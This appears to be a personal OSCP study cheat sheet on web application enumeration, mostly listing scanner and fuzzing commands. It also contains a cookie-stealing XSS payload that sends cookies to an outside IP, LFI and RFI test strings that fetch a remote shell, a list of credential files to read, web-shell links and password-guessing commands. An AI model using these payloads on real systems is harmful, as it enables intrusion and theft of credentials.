# Enumeration Checklist/Ideas (Not Comprhenehsive)
I built this list over my time of studying for the OSCP/PWK. It is FAR from being a complete list, but I would recommend using this as a starting point, and adding/removing as you see fit.
- Version Enumeration
- Google Searches:
    - github <application>
    - Enumerate for vulnerabilities
        - Google: `<application name> release notes`
        - Google: `<application name> security announcements`
        - Google: `<application name> vulnerabilies`
        - CVE Google Search: `"reported by" + CVE Google search` (if found from security announcements)
        - Enumerate for login information/credentials: `update database password <application>`
- whatweb, webtech
- Wappalyzer
- Review `nmap` Output
- Specialized Scanners?
- Visit website/manual enumeration
    - Source Code Analysis
    - Enumerate for Users, Usernames
    - `/robots.txt`
    - `/sitemap.xml`
    - `/crossdomain.xml`
    - `/clientaccesspolicy.xml`
    - `/.well-known/`
    - `404` error,
    - SSL/TLS scan
- Directory Enumeration
    - enum_dirsearch.sh (raft-medium-dirs, raft-medium-files, dirbuster-medium-sans-raft)
    - Recursive Search (helpful after initial directory enum, manual narrowing down)
    - Subdomain search (gobuster vhost)
- Nikto

- Specialized Scanners
    - WPScan
    - Droopescan
    - Curl Page
- Hacktricks Known Technologies Checklist - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web#web-tech-tricks
- More Hacktricks - https://book.hacktricks.xyz/pentesting/pentesting-web#step-by-step-web-application-discovery
    - Force Errors
    - Upload Files
    - Spidering
- Enumerate for SQLi
- XSS
    - javascript: `document.write('<img src="http://10.10.14.2/?'+document.cookie+'">');`
- Do you have version information?
- Jquery - if jquery exists, look at version to get ballpark idea of age/version of app

# Step 1: ALWAYS LOOK AT THE SOURCE CODE OF THE WEBPAGE!
- https://book.hacktricks.xyz/pentesting/pentesting-web
- https://medium.com/@nyomanpradipta120/local-file-inclusion-vulnerability-cfd9e62d12cb

## Manual Enumeration
- `curl`
- `curl -v --request OPTIONS http://<IP>{/uri}`
- `DAV = cadaver`
- `curl --upload-file <filename> http://<IP>{/uri}`

# Common Wordlists to use for Web App Scanning:
## Common Wordlists to use for Web Directory Scanning:

- `/usr/share/wordlists/dirb/common.txt`
- `/usr/share/wordlists/dirbuster/*.txt`
- `/usr/share/wordlists/wfuzz/general/*.txt`
- `/usr/share/seclists/Discovery/Web-Content/`
## Common Wordlists to use for User Enumeration Scanning:
- `/usr/share/seclists/Usernames`
- `/usr/share/wordlists/dirbuster/apache-user-enum-2.0`

# Web App Scanners
- Nikto: `nikto --url http://websitehere`

## Wpscan:
- `wpscan --url <domain>`
- `wpscan --url  --enumerate ap at` (All Plugins, All Themes)
- `wpscan --url <domain> --enumerate u` (Usernames)
- `wpscan --url <domain> --enumerate v`


# Dirb:
- `dirb <domain>`
- `dirb <domain> <wordlist>`

# Gobuster:

- `gobuster dir -u <url> -w /usr/share/wordlists/<Wordlist file>`
- `gobuster dir -u <url> -w /usr/share/wordlists/<Wordlist file> -a Firefox (Custom Agent)`
- `gobuster dir -u <url> -w /usr/share/wordlists/<Wordlist file> -x .php,.txt,.html`
- `gobuster dir -u <url> -w /usr/share/wordlists/<Wordlist file> -x .php,.txt,.html -s "200"`
- `gobuster dir -e -u <url> -w /usr/share/wordlists/<Wordlist file> -x .php,.txt,.html -s "200"`
- `gobuster dir -v -e -u <url> -w /usr/share/wordlists/<Wordlist file> -x .php,.txt,.html -s "200"`
- `gobuster dir -v -e -u <url> -w /usr/share/wordlists/<Wordlist file> -x .php,.txt,.html -s "200" -o output.txt`
- `gobuster dir -s 200,204,301,302,307,403 -u 172.21.0.0 -w /usr/share/seclists/Discovery/Web_Content/big.txt -t 80 -a 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'`

## VHost - subdomain enumeration
- `gobuster vhost -u http://target.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`

# Wfuzz:
- `wfuzz -w wordlist/general/common.txt http://testphp.vulnweb.com/FUZZ`
- `wfuzz -z range,0-10 --hl 97 http://testphp.vulnweb.com/listproducts.php?cat=FUZZ`
- Post Requests: `wfuzz -z file,wordlist/others/common_pass.txt -d "uname=FUZZ&pass=FUZZ" --hc 302 http://testphp.vulnweb.com/userinfo.php `
- Cookie Fuzzing: `wfuzz -z file,wordlist/general/common.txt -b cookie=value1 -b cookie2=value2 http://testphp.vulnweb.com/FUZZ`
- `wfuzz -c -t 15 -R 5 -L --hc 404 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt http://10.11.1.123/FUZZ`
- Password Guessing: - `wfuzz -u http://website.com/loginURI -d 'username=admin&password=FUZZ' -w /usr/share/seclists/Passwords/darkweb2017-top1000.txt -hc 403`

# Dirsearch:
- `dirsearch /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 172.21.0.0 -e php`
- `dirsearch -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt f -e php,txt,cfg,html,sql,, -t 25 -o $(pwd)/dirsearch-80.json --format=json -x 403 -u http://192.168.182.72`
- `python3 dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -f -e ,,txt,cfg,html -t 50 --simple-report=dirsearch.txt -u targetsystem`
- `dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -f -e ,,txt,cfg,html -t 50 --format=simple -o dirsearch.txt -u targetsystem`

# FFuF:

- `ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://172.21.0.0`
- `ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -b "COOKIE VALUE; security=low" -u http://172.21.0.0`
- `ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://172.21.0.0 -fc 403, 302, 200`
- `ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -H "Host: 172.21.0.0" -u http://172.21.0.0`
- `ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://172.21.0.0 -timeout 5`

# Other Tools:
- Burp Suite
- OWASP Zap
- Cadaver
- SQLMap
- Joomscan
- Feroxbuster

# Testing for LFI (Local File Inclusion):

Examples:
- http://example.com/index.php?page=etc/passwd
- http://example.com/index.php?page=etc/passwd
- http://example.com/index.php?page=../../etc/passwd
- http://example.com/index.php?page=%2e%2e%2f
- http://example.com/index.php?page=....//....//etc/passwd

## Resources:
- https://www.exploit-db.com/docs/english/40992-web-app-penetration-testing---local-file-inclusion-(lfi).pdf
- LFI List from Ippsec: https://github.com/MrW0l05zyn/pentesting/blob/master/web/payloads/lfi-rfi/lfi-linux-list.txt
- https://web.archive.org/web/20210922221042/https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/

## Interesting Files:

### Linux:
- /etc/passwd
- /etc/shadow
- /etc/issue
- /etc/group
- /etc/hostname
- /etc/ssh/ssh_config
- /etc/ssh/sshd_config
- /root/.ssh/id_rsa
- /root/.ssh/authorized_keys
- /home/user/.ssh/authorized_keys
- /home/user/.ssh/id_rsa
- /etc/apache2/apache2.conf
- /etc/apache2/.htpasswd
- /usr/local/etc/apache2/httpd.conf
- /etc/httpd/conf/httpd.conf
- /home/[user]/.bash_history
- ...don't forget about /var/www/html/...
- pyftpdlib
- exim smtpd
- apache
- squid http proxy
- PHP cli server 5.5 or later (PHP 7.3.14-1)
- FreeFloat ftpd 1.00

### Windows:
- /boot.ini
- /autoexec.bat
- /windows/system32/drivers/etc/hosts
- /windows/repair/SAM
- /windows/system32/eula.txt
- /windows/repair/SAM
- /windows/system32/config/regback/default
- /windows/system32/config/regback/sam
- /windows/system32/config/regback/security
- /windows/system32/config/regback/system
- /windows/system32/config/regback/software
- /windows/panther/unattended.xml
- /windows/panther/unattend/unattended.xml


# Testing for RFI (Remote File Inclusion):
Examples:
- http://example.com/index.php?page=http://callback.com/shell.txt
- http://example.com/index.php?page=http://callback.com/shell.txt
- http://example.com/index.php?page=http:%2f%2fcallback.com%2fshell.txt

## Resources
- Turning LFI to RFI: https://l.avala.mp/?p=241


# Web Enumeration Tools
- nikto
- gobuster / dirsearch / rustbuster / dirb​
- burpsuite​
- curl / wget / telnet / nc​
- wpscan (Wordpress) / joomscan (Joomla) / droopescan (Drupal)​
- sqlmap​
- hydra​
- cadaver / davtest​
- Tamper Data
- OCSC Web Enum Techniques
- Web Server or Web App CVEs​
- Check for disallowed entries in robots.txt​
- Check the page source (Ctrl + U)​
- Directory Traversal​
- File Upload (and bypassing restrictions)​
- LFI / RFI​
- SQL Injection / Authentication Bypass​
- Command Execution​
- WebApp functionality​
- Site Editor tools, such as Site Template Editors​
- Credential re-use
- PHP Files
- https://github.com/Dhayalanb/windows-php-reverse-shell
- https://github.com/Arrexel/phpbash
- https://github.com/flozz/p0wny-shell

# Password Guessing
- It's not recommended to use large wordlists (i.e. rockyou.txt) when guessing passwords over the internet, better to use a smaller list (cewl, or darkweb2017-top1000.txt)

## Hydra
- `hydra -l admin -P /usr/sahre/seclists/Passwords/darkweb2017-top1000.txt -f 10.10.10.2 http-get /targetURI`